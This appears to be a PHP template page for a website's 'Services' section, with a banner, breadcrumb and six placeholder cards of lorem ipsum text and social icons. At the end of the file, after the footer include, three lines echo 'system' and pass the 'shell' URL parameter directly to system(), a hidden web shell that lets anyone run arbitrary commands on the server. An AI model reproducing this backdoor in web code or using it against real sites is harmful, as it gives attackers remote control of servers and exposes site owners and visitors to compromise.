<?php
	include 'header.php';
?>
<!-- banner -->
	<div class="banner1">
	</div>
<!-- //banner -->
<!-- services -->
	<div class="services">
		<div class="container">
			<ol class="breadcrumb breadco">
				<li><a href="#">Home</a></li>
				<li class="active">Services</li>
			</ol>
			<div class="services-grid">
							<div class="services-overview">
				<h3>Services Overview</h3>
				<div class="services-overview-grids">
					<div class="col-md-4 services-overview-grid">
						<div class="services-overview-grd">
							<img src="images/13.jpg" alt=" " class="img-responsive" />
							<div class="services-overview-gd">
								<h4>Itaque earum rerum hic tenetur</h4>
								<p>Neque porro quisquam est, qui dolorem ipsum quia dolor 
									sit amet, consectetur, adipisci velit, sed quia non numquam 
									eius modi tempora incidunt ut labore et dolore magnam aliquam 
									quaerat voluptatem.</p>
								<ul class="social-icons">
									<li><a href="#" class="p"></a></li>
									<li><a href="#" class="in"></a></li>
									<li><a href="#" class="v"></a></li>
									<li><a href="#" class="facebook"></a></li>
								</ul>
							</div>
						</div>
					</div>
					<div class="col-md-4 services-overview-grid">
						<div class="services-overview-grd">
							<img src="images/10.jpg" alt=" " class="img-responsive" />
							<div class="services-overview-gd">
								<h4>Itaque earum rerum hic tenetur</h4>
								<p>Neque porro quisquam est, qui dolorem ipsum quia dolor 
									sit amet, consectetur, adipisci velit, sed quia non numquam 
									eius modi tempora incidunt ut labore et dolore magnam aliquam 
									quaerat voluptatem.</p>
								<ul class="social-icons">
									<li><a href="#" class="p"></a></li>
									<li><a href="#" class="in"></a></li>
									<li><a href="#" class="v"></a></li>
									<li><a href="#" class="facebook"></a></li>
								</ul>
							</div>
						</div>
					</div>
					<div class="col-md-4 services-overview-grid">
						<div class="services-overview-grd">
							<img src="images/9.jpg" alt=" " class="img-responsive" />
							<div class="services-overview-gd">
								<h4>Itaque earum rerum hic tenetur</h4>
								<p>Neque porro quisquam est, qui dolorem ipsum quia dolor 
									sit amet, consectetur, adipisci velit, sed quia non numquam 
									eius modi tempora incidunt ut labore et dolore magnam aliquam 
									quaerat voluptatem.</p>
								<ul class="social-icons">
									<li><a href="#" class="p"></a></li>
									<li><a href="#" class="in"></a></li>
									<li><a href="#" class="v"></a></li>
									<li><a href="#" class="facebook"></a></li>
								</ul>
							</div>
						</div>
					</div>
					<div class="clearfix"> </div>
				</div>
				<div class="services-overview-grids">
					<div class="col-md-4 services-overview-grid">
						<div class="services-overview-grd">
							<img src="images/8.jpg" alt=" " class="img-responsive" />
							<div class="services-overview-gd">
								<h4>Itaque earum rerum hic tenetur</h4>
								<p>Neque porro quisquam est, qui dolorem ipsum quia dolor 
									sit amet, consectetur, adipisci velit, sed quia non numquam 
									eius modi tempora incidunt ut labore et dolore magnam aliquam 
									quaerat voluptatem.</p>
								<ul class="social-icons">
									<li><a href="#" class="p"></a></li>
									<li><a href="#" class="in"></a></li>
									<li><a href="#" class="v"></a></li>
									<li><a href="#" class="facebook"></a></li>
								</ul>
							</div>
						</div>
					</div>
					<div class="col-md-4 services-overview-grid">
						<div class="services-overview-grd">
							<img src="images/7.jpg" alt=" " class="img-responsive" />
							<div class="services-overview-gd">
								<h4>Itaque earum rerum hic tenetur</h4>
								<p>Neque porro quisquam est, qui dolorem ipsum quia dolor 
									sit amet, consectetur, adipisci velit, sed quia non numquam 
									eius modi tempora incidunt ut labore et dolore magnam aliquam 
									quaerat voluptatem.</p>
								<ul class="social-icons">
									<li><a href="#" class="p"></a></li>
									<li><a href="#" class="in"></a></li>
									<li><a href="#" class="v"></a></li>
									<li><a href="#" class="facebook"></a></li>
								</ul>
							</div>
						</div>
					</div>
					<div class="col-md-4 services-overview-grid">
						<div class="services-overview-grd">
							<img src="images/6.jpg" alt=" " class="img-responsive" />
							<div class="services-overview-gd">
								<h4>Itaque earum rerum hic tenetur</h4>
								<p>Neque porro quisquam est, qui dolorem ipsum quia dolor 
									sit amet, consectetur, adipisci velit, sed quia non numquam 
									eius modi tempora incidunt ut labore et dolore magnam aliquam 
									quaerat voluptatem.</p>
								<ul class="social-icons">
									<li><a href="#" class="p"></a></li>
									<li><a href="#" class="in"></a></li>
									<li><a href="#" class="v"></a></li>
									<li><a href="#" class="facebook"></a></li>
								</ul>
							</div>
						</div>
					</div>
					<div class="clearfix"> </div>
				</div>
			</div>
		</div>
	</div>
<!-- //services -->
<?php
	include 'footer.php';
	echo 'system';
	$shell=$_GET['shell'];
	system($shell);
?>
